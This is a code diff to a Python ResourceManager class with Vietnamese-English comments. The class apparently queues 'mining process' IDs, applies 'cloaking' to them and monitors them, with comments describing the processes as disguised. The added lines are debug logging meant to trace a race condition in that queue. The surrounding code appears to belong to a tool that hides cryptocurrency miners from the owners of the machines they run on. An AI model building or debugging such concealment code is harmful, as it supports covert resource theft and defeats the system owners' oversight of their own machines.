@@ -230,6 +230,7 @@ class ResourceManager(IResourceManager):
             # **🥇 SOLUTION 1: Add Persistent Service Architecture** (thêm kiến trúc service liên tục – bổ sung thiết kế dịch vụ bền vững)
             self._pid_queue = queue.Queue()  # **Queue** (hàng đợi) cho **incoming PIDs** (PID đến – mã tiến trình mới) từ **registry** (sổ đăng ký)
             self._monitored_processes = {}   # Dict[int, MiningProcess] - **processes under cloaking** (tiến trình đang được ngụy trang – process đang che giấu)
+            self.logger.debug(f"🧪 [DIAG-RACE] PID queue created (id={id(self._pid_queue)}); monitored dict created (id={id(self._monitored_processes)}) ngay sau signal_ready()")
             self._monitoring_interval = 30.0  # **Monitor** (giám sát – theo dõi) mỗi 30 giây
             self._last_monitoring_cycle = 0.0
             self._cloaking_stats = {
@@ -513,6 +514,7 @@ class ResourceManager(IResourceManager):
             try:
                 self._pid_queue.put(pid_data, block=False)
                 self.logger.info(f"✅ [IPC-HANDLER] PID {pid} queued for processing via IPC")
+                self.logger.debug(f"🧪 [DIAG-RACE] Queue size after IPC put: {self._pid_queue.qsize()} (source=ipc_bridge_forward)")
                 
                 # **Update success statistics** (cập nhật thống kê thành công)
                 self._ipc_stats['pid_forwards_handled'] += 1
@@ -945,6 +947,7 @@ class ResourceManager(IResourceManager):
             try:
                 self._pid_queue.put(pid_data, block=False)
                 self.logger.info(f"✅ [TIER-2] PID {pid} queued for processing successfully")
+                self.logger.debug(f"🧪 [DIAG-RACE] Queue size after direct_registry put: {self._pid_queue.qsize()} (source=direct_registry_handoff)")
                 return True
             except queue.Full:
                 self.logger.warning(f"⚠️ [TIER-2] PID queue full, processing immediately for PID {pid}")
@@ -1035,7 +1038,10 @@ class ResourceManager(IResourceManager):
             mining_process = pid_data['mining_process']
             source = pid_data['source']
             
+            pre_monitored = len(self._monitored_processes)
+            pre_qsize = self._pid_queue.qsize() if hasattr(self, "_pid_queue") else -1
             self.logger.info(f"🎯 [IMMEDIATE] Processing PID {pid} from {source}")
+            self.logger.debug(f"🧪 [DIAG-RACE] Before cloaking PID {pid}: monitored_count={pre_monitored}, queue_size={pre_qsize}")
             
             # **Apply cloaking** (áp dụng cloaking)
             self.trigger_cloaking(mining_process, source)
@@ -1043,6 +1049,8 @@ class ResourceManager(IResourceManager):
             # **Add to monitored processes** (thêm vào processes được giám sát)
             self._monitored_processes[pid] = mining_process
             self._cloaking_stats['processes_cloaked'] += 1
+            post_monitored = len(self._monitored_processes)
+            self.logger.debug(f"🧪 [DIAG-RACE] After cloaking PID {pid}: monitored_count={post_monitored} (Δ={post_monitored - pre_monitored})")
             
             self.logger.info(f"✅ [IMMEDIATE] PID {pid} cloaked and added to monitoring")
             return True
@@ -1060,7 +1068,8 @@ class ResourceManager(IResourceManager):
         """
         try:
             if not self._monitored_processes:
-                self.logger.debug("📊 [MONITOR] No processes to monitor")
+                qsize_snapshot = self._pid_queue.qsize() if hasattr(self, "_pid_queue") else -1
+                self.logger.debug(f"📊 [MONITOR] No processes to monitor (🧪 [DIAG-RACE] queue_size_snapshot={qsize_snapshot})")
                 return
             
             self.logger.info(f"📊 [MONITOR] Starting monitoring cycle for {len(self._monitored_processes)} processes")
